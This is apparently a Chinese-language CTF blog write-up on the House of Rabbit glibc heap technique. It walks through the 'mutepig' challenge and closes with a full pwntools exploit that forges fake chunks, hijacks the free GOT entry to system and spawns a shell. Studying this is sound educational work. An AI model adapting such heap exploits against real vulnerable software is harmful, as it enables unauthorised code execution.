---
title: House of Rabbit
date: '2025-03-26 09:04:09'
updated: '2025-04-07 21:39:55'
---
## 简介
House of rabbit是一种伪造堆块的技术，一般运用在fastbin attack中，在unsortedbin之类的链表里面有更好的利用方式，一般适用于2.23到2.26之间（也就是没有tcachebin），但是即使是有tcachebin，也是存在利用的（一直到2.31都是可以的），只要将相应大小的堆块tcachebin链表填满就行（但是很明显多此一举，我们没有必要这么做）

利用的重点在于malloc_consolidate函数，借用ctfwiki里面所说，fastbin中会把相同的size的被释放的堆块用一个单向链表管理，分配的时候会检查size是否合理，如果不合理程序就会异常退出。而house of rabbit就利用了在malloc consolidate的时候fastbin中的堆块进行合并时size没有进行检查从而伪造一个假的堆块

## 漏洞成因
overflow write、use after free

## 适用范围
2.23——2.26

超过 0x400 大小的堆分配

可以写 fastbin 的 fd 或者 size 域

## 利用原理
该利用技巧的核心是 malloc_consolidate 函数，当检测到有 fastbin 的时候，会取出每一个 fastbin chunk，将其放置到 unsortedbin 中，并进行合并。以修改 fd 为例，利用过程如下：

1. 申请 chunk A、chunk B，其中 chunk A 的大小位于 fastbin 范围
2. 释放 chunk A，使其进入到 fastbin
3. 利用 use after free，修改 A->fd 指向地址 X，需要伪造好 fake chunk，使其不执行 unlink 或者绕过 unlink
4. 分配足够大的 chunk，或者释放 0x10000 以上的 chunk，只要能触发 malloc_consolidate 即可
5. 此时 fake chunk 被放到了 unsortedbin，或者进入到对应的 smallbin/largebin
6. 取出 fake chunk 进行读写即可

### 相关技巧
+ 2.26 加入了 unlink 对 presize 的检查
+ 2.27 加入了 fastbin 的检查

抓住重点：house of rabbit 是对 malloc_consolidate 的利用

<font style="background-color:#FBDE28;">largebin中最大的chunk范围是0x80000 - ∞</font>

## 利用效果
+ 任意地址分配
+ 任意地址读写

## 例子
1. 填充0x20和0x90的tcache，是为了将后续释放堆块放到fatsbin中
2. 连续两次分配释放 0xa00000的大块，是为了扩大top chunk的大小；
3. 分别申请一个0x20的fastbin和一个0x90的smallbin，并释放0x20的chunk到fastbin中；
4. 然后再bss中伪造一组size，其中第一个fake_chunk的prev_size为0xfffffffffffffff0，这样是保证整数溢出，当前fake_chunk_addr 加上这个size，其实是会向上溢出。
5. 修改0x20的fastbin的 fd指向 fake_chunk1，此时达成了house of rabbit的触发条件
6. 首先释放smallbin，此时由于和top chunk会与其合并，此时就只有 fake_chunk进入了unsortedbin
7. 将fake_chunk仅仅放入unsortedbin是不够的，还需要将其放入largebin中。 申请大于0xffff的大块，会将 fake_chunk放入largebin中，不过之前得修改fake_chunk得size为0xa00001，其目的有两个，1是绕过程序对unsorted bin中内存块大小小于av->system_mem的检测；2是使程序放入large bin的最后一块（>0x800000)
8. 然后，再将fake_chunk的size改为 0xfffffffffffffff1，然后再申请 malloc((void*)&target-(void*)(gbuf+2)-0x20);，此处的target是我们想任意分配的地址。POC中的target地址比 fake_chunk_addr小，不过问题不大，这里相减会得到一个负数，但是Malloc中是用 unsigned int来识别size，此时会得到一个大数，但不超过 fake_size。申请的 size+fake_chunk_addr会直接溢出，导致得到的结果，刚好为我们的target_addr。如下图所示：我们完成这个malloc后，fake_chunk剩余的 remainder是刚好指向 target地址

## HITB-GSEC-XCTF 2018 mutepig
![](/images/6e10b2c7f769d1876434e2803dec70c6.png)

got 表部分可写，没有 PIE，有 canary 和 NX

程序的 banner 是通过

![](/images/8b9477e75ae73e44cba416af1a2bdde4.png)

来实现的，这里有个 system 函数可以利用

![](/images/16455bcf94af27a37105a52895628e8c.png)

main 函数三个选项（三个选项函数名我改了）

1. mallocsize：

![](/images/77c1bea011a929a1f03f4e66b4b7a42b.png)

一共能申请四种大小的 chunk：

+ 0x10（fastchunk）
+ 0x80（smallchunk）
+ 0xA00000（mmapchunk）
+ 0xFFFFFFFFFFFFFF70（超级大 chunk）

最大的0xFFFFFFFFFFFFFF70 chunk 只能申请一次

堆的指针存在 bss 段的 chunkptrs 数组



2. delete

![](/images/9c4ef9e8c26f325191a540f7af75df30.png)

没有把指针置零，存在 UAF 漏洞



3. editindex

![](/images/be8c87d277135cfe2a9ad93cd5acdc11.png)

先是编辑一次对应索引的 chunk 的内容，只能读取 8 个字节，而且第 8 个会被覆盖成空字节

然后再给一次编辑 bss 段上一段自由内存的机会，可以输入 48 个字节

其中的 edit 函数是程序自定义的编辑函数（名字也是我这里改过）

![](/images/7a002ce68334189b26b9ec2208e60c4d.png)

把输入的内容的最后一个字节置零

<font style="background-color:#FBDE28;">正常来说 </font>`<font style="background-color:#FBDE28;">p64()</font>`<font style="background-color:#FBDE28;"> 结尾本来就是空字节，但是 WP 都用了 </font>`<font style="background-color:#FBDE28;">[:7]</font>`<font style="background-color:#FBDE28;"> 或者 </font>`<font style="background-color:#FBDE28;">[:-1]</font>`<font style="background-color:#FBDE28;"> 来改输入，而且不用的话会报 broken pipe 的错...这里没搞懂...</font>

定义函数：

```python
def add(sizetype,chunkcontent): #1:0x10 2:0x80 3:0xa00000 13337:0xffffffffffffff70
    link.sendline(b'1')
    link.sendline(str(sizetype))
    link.sendline(chunkcontent)
    sleep(0.1)

def free(index):
    link.sendline(b'2')
    link.sendline(str(index))
    sleep(0.1)

def edit(index,chunkcontent,bsscontent):
    link.sendline(b'3')
    link.sendline(str(index))
    link.sendline(chunkcontent)
    link.sendline(bsscontent)
    sleep(0.1)
```

### 扩大 topchunk
题目给了四种大小的 chunk 可以申请，最大的只能申请一次，而 0xa00000 大小的可以申请多几次，

按照 house of rabbit 的过程，先申请两次 0xa00000 大小的，（因为 0xa00000 大小比 topchunk 还要大，所以会用 mmap 来申请）再释放掉之后，topchunk 的大小就会变大

```python
add(3,b'a') #0 mmap largechunk
free(0)
add(3,b'b') #1 mmap largechunk
free(1)
```

原本的 topchunk

![](/images/b2579f5e2970149a77ef993a3fbd3e4b.png)

申请然后释放了第一个 largechunk 大小的 chunk 之后

![](/images/3afb9ecc9c582262f2b34fda5f0d4cf0.png)

重复第二遍，这个时候 topchunk 的 size 就变大了很多

![](/images/236cd57da065e8ee223fb9d4dcb2b272.png)

> 这里动调其实遇到了一点状况，可能是本来这样？在堆上只有 mmap 申请得到的 chunk 而且它还没被释放的情况下输入 heap 指令会报错（刚开始还以为符号又掉了...）
>

![](/images/d8d015b4af4a2fa06040e0029eb8887e.png)

### 利用 UAF 修改 fd，伪造 chunk
接着是利用 UAF 来修改 fastchunk 的 fd，让合并时 fastchunk 指向的 fakechunk 进入 unsortedbin

找到的 WP 都没提到这里为什么要在 bss 段伪造两个连续的 fakechunk，

我感觉应该是为了绕过 malloc_consolidate，在把 fakechunk 放进 unsortedbin 之前会检查前一个 chunk 的 size 跟合并的 fastchunk 的 size 是否一样（没找到资料，不知道是因为什么机制）

```python
add(1,b'c') #2 fastchunk
add(2,b'd') #3 smallchunk
free(2)#   ↓fakechunk_prev  ↓fakechunk   
fakechunk=p64(0)+p64(0x11)+p64(0)+p64(0xfffffffffffffff1)
edit(2,p64(0x602130)[:7],fakechunk)
```

smallchunk 要跟 topchunk 相邻

### 触发 malloc_consolidate
释放 smallchunk 触发 malloc_consolidate 将 fakechunk 放进 unsortedbin，然后再把 bss 段的 fakechunk 的 size 改回小于 topchunk 的大小，这样后面才能正常申请 0xa00000 的 chunk

```python
free(3)
fakechunk=p64(0x0)+p64(0x11)+p64(0)+p64(0xa00001)
edit(3,p64(0x602130)[:7],fakechunk)
```

可以提前在 chunk 里面放好"/bin/sh"，后面把 free 函数 got 表改成 system 之后就可以直接 free 这个 chunk 来 getshell 了

接着是申请一个 chunk 让它遍历一遍 unsortedbin 把 fakechunk 放进 largebin 里面，然后再把 size 改回0xfffffffffffffff1，这样后面的超级大 chunk 就可以正常申请了

```python
add(3,b'/bin/sh') #4 largechunk
fakechunk=p64(0x0)+p64(0x11)+p64(0)+p64(0xfffffffffffffff1)
edit(3,p64(0x602130)[:7],fakechunk)
```

### malloc 上溢申请到堆指针数组 chunk
fakechunk 的地址是 0x602130，程序 malloc 了 0xffffffffffffff70（int 等于 -0x90） 大小的 chunk，因为 size_t 是 unsignedint，所以这个时候 size 上溢出，在 malloc 完之后 remainder（fakechunk 剩下的部分）的地址就在 fakechunk 往上 0x90 的位置，也就是 0x6020a0，再申请一个 chunk 正好从 0x6020c0 开始

0x6020c0 就是 bss 段上面放着堆指针的数组起始地址

```python
add(13337,b'a') #5 "hugechunk"
```

### 修改堆指针->修改 free_got 为 system
```python
add(1,p64(elf.got['free'])[:7]) #6
edit(0,p64(elf.symbols['system'])[:7],b'a')
free(2)
```

完整 exp：

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

link=process("./mutepig")
elf=ELF("./mutepig")
libc=ELF('./glibc/2.23-0ubuntu3_amd64/libc.so.6')

# gdb.attach(link,'set solib-search-path ~/FocusingCTF/glibc/2.23-0ubuntu3_amd64/')
# pause()

def add(sizetype,chunkcontent): #1:0x10 2:0x80 3:0xa00000 13337:0xffffffffffffff70
    link.sendline(b'1')
    link.sendline(str(sizetype))
    link.send(chunkcontent)
    sleep(0.1)

def free(index):
    link.sendline(b'2')
    link.sendline(str(index))
    sleep(0.1)

def edit(index,chunkcontent,bsscontent):
    link.sendline(b'3')
    link.sendline(str(index))
    link.send(chunkcontent)
    link.send(bsscontent)
    sleep(0.1)

add(3,b'a') #0 mmap largechunk
free(0)
add(3,b'b') #1 mmap largechunk
free(1)

add(1,b'c') #2 fastchunk
add(2,b'd') #3 smallchunk
free(2)
fakechunk=p64(0)+p64(0x11)+p64(0)+p64(0xfffffffffffffff1)
edit(2,p64(0x602130)[:7],fakechunk)
free(3)
fakechunk=p64(0x0)+p64(0x11)+p64(0)+p64(0xa00001)
edit(3,p64(0x602130)[:7],fakechunk)

add(3,b'/bin/sh') #4 largechunk
fakechunk=p64(0x0)+p64(0x11)+p64(0)+p64(0xfffffffffffffff1)
edit(3,p64(0x602130)[:7],fakechunk)
add(13337,b'a') #5 "hugechunk"

print(hex(elf.got['free']))
print(hex(elf.symbols['system']))
add(1,p64(elf.got['free'])[:7]) #6
edit(0,p64(elf.symbols['system'])[:7],b'a')
free(2)

link.interactive()
```

